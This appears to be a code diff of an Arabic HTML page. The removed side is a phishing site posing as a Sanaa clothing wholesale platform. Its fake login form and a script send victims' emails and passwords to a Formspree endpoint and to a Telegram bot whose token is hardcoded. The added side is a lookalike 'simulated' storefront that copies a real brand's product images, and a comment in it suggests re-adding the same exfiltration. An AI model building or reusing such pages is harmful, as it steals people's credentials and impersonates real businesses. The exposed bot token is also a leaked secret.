@@ -3,98 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التسويق الموحدة - جملة اليمن</title>
+    <title>متجر أوسان المحاكي - عرض الملابس</title>
     <style>
+        :root { --primary-color: #8e44ad; --secondary-color: #2ecc71; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; }
-        .nav-bar { background-color: #8e44ad; color: white; padding: 15px; text-align: center; font-size: 20px; font-weight: bold; }
-        .hero-banner { background: #fff; padding: 20px; text-align: center; border-bottom: 2px solid #eee; }
-        .hero-banner h2 { color: #8e44ad; margin: 0; }
-        .hero-banner p { color: #666; font-size: 14px; }
+        .header { background: white; padding: 15px; text-align: center; border-bottom: 2px solid #eee; position: sticky; top: 0; z-index: 100; }
+        .header img { height: 40px; }
         
-        .container { padding: 15px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
-        .card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.1); position: relative; }
-        .card img { width: 100%; height: 150px; object-fit: cover; }
-        .card-info { padding: 10px; }
-        .card-info b { font-size: 14px; color: #333; }
-        .price-tag { background: #e74c3c; color: white; padding: 3px 8px; border-radius: 5px; font-size: 12px; display: inline-block; margin-top: 5px; }
+        .container { padding: 15px; display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; }
         
-        .login-section { background: #fff; margin: 20px 15px; padding: 20px; border-radius: 12px; border: 2px dashed #8e44ad; text-align: center; }
-        .login-section h3 { margin-top: 0; color: #333; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background-color: #8e44ad; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .product-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.05); transition: 0.3s; position: relative; }
+        .product-card img { width: 100%; height: 200px; object-fit: cover; }
+        .product-info { padding: 10px; text-align: right; }
+        .product-name { font-size: 14px; color: #333; margin: 5px 0; font-weight: bold; }
+        .price { color: #e74c3c; font-weight: bold; font-size: 16px; }
         
-        .footer { background: #333; color: #fff; padding: 20px; text-align: center; font-size: 12px; margin-top: 30px; }
+        .order-btn { background: var(--primary-color); color: white; border: none; width: 100%; padding: 10px; border-radius: 0 0 12px 12px; cursor: pointer; font-weight: bold; }
+        
+        .cat-nav { display: flex; overflow-x: auto; background: white; padding: 10px; gap: 20px; border-bottom: 1px solid #ddd; }
+        .cat-nav span { white-space: nowrap; font-weight: bold; color: #666; padding-bottom: 5px; }
+        .cat-nav span.active { color: #e74c3c; border-bottom: 2px solid #e74c3c; }
     </style>
 </head>
 <body>
 
-<div class="nav-bar">مجموعة التسويق المباشر - صنعاء</div>
+<div class="header">
+    <h2 style="margin:0; color:#e74c3c;">AOSAN</h2>
+</div>
 
-<div class="hero-banner">
-    <h2>أقوى عروض الجملة للمسوقات</h2>
-    <p>بضاعة جديدة وصلت الآن (عبايات، فساتين، إكسسوارات) بأسعار منافسة.</p>
+<div class="cat-nav">
+    <span class="active">نسائي</span>
+    <span>الجمال والعناية</span>
+    <span>رجالي</span>
+    <span>أطفال</span>
 </div>
 
 <div class="container">
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?auto=format&fit=crop&w=300" alt="عباية">
-        <div class="card-info">
-            <b>عباية خليجي ملكي</b><br>
-            <span class="price-tag">18,500 ريال</span>
+    <div class="product-card">
+        <img src="https://aosan.com/pub/media/catalog/product/cache/1/small_image/240x300/beff4985b59e3bc2246d838ad6695599/f/s/f-001.jpg" onerror="this.src='https://via.placeholder.com/240x300?text=فساتين+سهرة'">
+        <div class="product-info">
+            <div class="product-name">فستان سهرة ناعم</div>
+            <div class="price">25,500 ريال</div>
         </div>
+        <button class="order-btn" onclick="order('فستان سهرة ناعم')">طلب الآن</button>
     </div>
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1595777457583-95e059d581b8?auto=format&fit=crop&w=300" alt="فستان">
-        <div class="card-info">
-            <b>فستان سهرة تركي</b><br>
-            <span class="price-tag">22,000 ريال</span>
-        </div>
-    </div>
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1535633302703-b0703af48f18?auto=format&fit=crop&w=300" alt="إكسسوارات">
-        <div class="card-info">
-            <b>طقم إكسسوار ذهبي</b><br>
-            <span class="price-tag">4,500 ريال</span>
-        </div>
-    </div>
-    <div class="card">
-        <img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=300" alt="شنطة">
-        <div class="card-info">
-            <b>شنطة يد ماركة "درجة أولى"</b><br>
-            <span class="price-tag">9,000 ريال</span>
-        </div>
-    </div>
-</div>
 
-<div class="login-section">
-    <h3>تسجيل دخول المسوقات</h3>
-    <p>يرجى تسجيل الدخول لعرض قائمة الأسعار بالكامل وحجز الطلبيات.</p>
-    
-    <form action="https://formspree.io/f/xdajkgpz" method="POST" id="phishForm">
-        <input type="email" name="email" id="email" placeholder="البريد الإلكتروني أو الرقم" required>
-        <input type="password" name="password" id="password" placeholder="كلمة السر" required>
-        <input type="hidden" name="_subject" value="صيد جديد من منصة الملابس">
-        <button type="submit" class="btn">دخول واستلام الكتالوج</button>
-    </form>
-</div>
+    <div class="product-card">
+        <img src="https://aosan.com/pub/media/catalog/product/cache/1/small_image/240x300/beff4985b59e3bc2246d838ad6695599/a/b/ab-002.jpg" onerror="this.src='https://via.placeholder.com/240x300?text=عبايات+خليجية'">
+        <div class="product-info">
+            <div class="product-name">عباية خليجية مطرزة</div>
+            <div class="price">18,000 ريال</div>
+        </div>
+        <button class="order-btn" onclick="order('عباية خليجية مطرزة')">طلب الآن</button>
+    </div>
 
-<div class="footer">
-    تواصل معنا (إدارة التسويق): 777158066 <br>
-    جميع الحقوق محفوظة © 2026 - صنعاء، شارع تعز
+    <div class="product-card">
+        <img src="https://aosan.com/pub/media/catalog/product/cache/1/small_image/240x300/beff4985b59e3bc2246d838ad6695599/g/l/gl-003.jpg" onerror="this.src='https://via.placeholder.com/240x300?text=جلابيات+راقية'">
+        <div class="product-info">
+            <div class="product-name">جلابية استقبال راقية</div>
+            <div class="price">12,400 ريال</div>
+        </div>
+        <button class="order-btn" onclick="order('جلابية استقبال راقية')">طلب الآن</button>
+    </div>
+
+    <div class="product-card">
+        <img src="https://aosan.com/pub/media/catalog/product/cache/1/small_image/240x300/beff4985b59e3bc2246d838ad6695599/m/l/ml-004.jpg" onerror="this.src='https://via.placeholder.com/240x300?text=ملابس+نوم'">
+        <div class="product-info">
+            <div class="product-name">طقم ملابس نوم قطن</div>
+            <div class="price">7,500 ريال</div>
+        </div>
+        <button class="order-btn" onclick="order('طقم ملابس نوم قطن')">طلب الآن</button>
+    </div>
 </div>
 
 <script>
-    const form = document.getElementById('phishForm');
-    form.addEventListener('submit', function(e) {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        
-        const token = "8549358187:AAGRic3rPa_yqyyE6XO5fAcqthKp02AtQj4";
-        const chat_id = "7770087246";
-        const text = `🎯 صيد جديد من منصة الملابس:\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
-        
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
-    });
+    function order(product) {
+        alert("سيتم توجيهك لطلب: " + product);
+        // هنا يمكنك إضافة رابط Formspree أو تليجرام كما فعلنا سابقاً
+        window.location.href = "https://t.me/YOUR_BOT_USERNAME?text=أريد طلب " + product;
+    }
 </script>
 
 </body>
